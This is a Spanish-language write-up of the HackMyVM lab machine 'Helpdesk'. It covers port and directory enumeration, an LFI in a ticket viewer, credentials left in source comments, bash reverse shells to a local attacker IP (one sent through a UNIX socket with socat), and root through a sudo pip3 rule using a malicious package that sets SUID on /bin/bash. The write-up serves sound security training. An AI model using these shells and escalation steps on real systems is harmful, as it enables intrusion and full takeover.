# Helpdesk - Writeup HackMyVm

El día de hoy veremos cómo resolver la máquina **Helpdesk** de la
plataforma HackMyVM.\
Durante la explotación tocaremos las siguientes técnicas:

-   Escaneo de puertos
-   Enumeración de directorios
-   Fuzzing para descubrir un parámetro PHP
-   LFI (Local File Inclusion)
-   Abuso de sockets UNIX
-   Escalada de privilegios con `pip3`

## Enumeración

Comenzamos con un escaneo de puertos con **nmap**:

``` bash
sudo nmap -p- --open -sSCV --min-rate 5000 -n -Pn 192.168.1.156
```

``` java
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b4:bc:42:f6:d0:a7:0d:fd:71:01:3d:8a:c5:0c:ac:e3 (ECDSA)
|_  256 71:90:08:58:14:04:09:d5:cf:31:ee:87:17:ad:29:8f (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: HelpDesk Ticket System

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

En el puerto 80 se muestra un sistema de HelpDesk muy limitado:

![alt text](img/helpdesk001.png)

Pasamos a enumerar directorios con **gobuster**:

``` bash
gobuster dir -u http://192.168.1.156/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html -t 20
```

Resultados interesantes:

    /login.php   (Status: 200)
    /ticket.php  (Status: 200)
    /panel.php   (Status: 302 -> login.php)
    /debug.php   (Status: 200)

En `/debug.php` aparecen credenciales falsas (honeypot).\
En `/ticket.php` solo aparece el texto *"Ticket Viewer"* vacío:

![alt text](img/helpdesk002.png)

Esto sugiere que el archivo podría aceptar parámetros. Probamos fuzzing
con **ffuf**:

``` bash
ffuf -u 'http://192.168.1.156/ticket.php?FUZZ=../../../../../../../../etc/passwd' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 204
```

Encontramos un parámetro vulnerable a **LFI**:

![alt text](img/helpdesk003.png)

## Explotación

Explorando archivos del sistema vía LFI, en `login.php` encontramos
comentarios con credenciales en texto claro:

![alt text](img/helpdesk004.png)

Accedemos con ellas en `/login.php` y entramos a `/panel.php`, donde hay
ejecución de comandos:

![alt text](img/helpdesk005.png)

Nos enviamos una reverse shell:

``` bash
nc -lvnp 9001
```

``` bash
bash -i >& /dev/tcp/192.168.1.152/9001 0>&1
```

``` bash
Ncat: Connection from 192.168.1.156
www-data@helpdesk:/var/www/html$
```

## Escalada de privilegios

En `/opt` encontramos un servicio con **sockets UNIX**:

``` bash
www-data@helpdesk:/opt/helpdesk-socket$ ls -la
-rwxr-xr-x 1 helpdesk helpdesk  158 Aug 16 15:32 handler.sh
srwxrwxrwx 1 helpdesk helpdesk    0 Aug 24 17:38 helpdesk.sock
-rw-r--r-- 1 root     root      184 Aug 16 15:44 serve.sh
```

Podemos enviar comandos al socket con **socat**:

``` bash
echo "id" | socat - UNIX-CONNECT:/opt/helpdesk-socket/helpdesk.sock
```

``` bash
uid=1001(helpdesk) gid=1001(helpdesk) groups=1001(helpdesk)
```

Esto nos permite ejecutar comandos como **helpdesk**.\
Nos mandamos una shell como ese usuario:

``` bash
echo 'bash -i >& /dev/tcp/192.168.1.152/9001 0>&1' | socat - UNIX-CONNECT:/opt/helpdesk-socket/helpdesk.sock
```

``` bash
helpdesk@helpdesk:/$
```

Comprobamos permisos sudo:

``` bash
sudo -l
```

    User helpdesk may run the following commands on helpdesk:
        (ALL) NOPASSWD: /usr/bin/pip3 install --break-system-packages *

Podemos abusar de esto creando un paquete Python malicioso.

### Paquete Malicioso

En la máquina atacante:

``` bash
mkdir -p paquete_malicioso/paquete_malicioso
cd paquete_malicioso
```

``` python
echo 'import os; os.system("chmod +s /bin/bash")' > paquete_malicioso/__init__.py
```

``` python
echo "from setuptools import setup, find_packages; setup(name='paquete_malicioso', version='0.1.0', packages=find_packages())" > setup.py
```

``` bash
python3 setup.py sdist
python3 -m http.server 8000
```

En la víctima:

``` bash
wget http://192.168.1.152:8000/dist/paquete_malicioso-0.1.0.tar.gz
sudo /usr/bin/pip3 install --break-system-packages ./paquete_malicioso-0.1.0.tar.gz
```

Esto le da el bit SUID a `/bin/bash`.\
Ejecutamos:

``` bash
bash -p
```

¡Y somos root! 🎉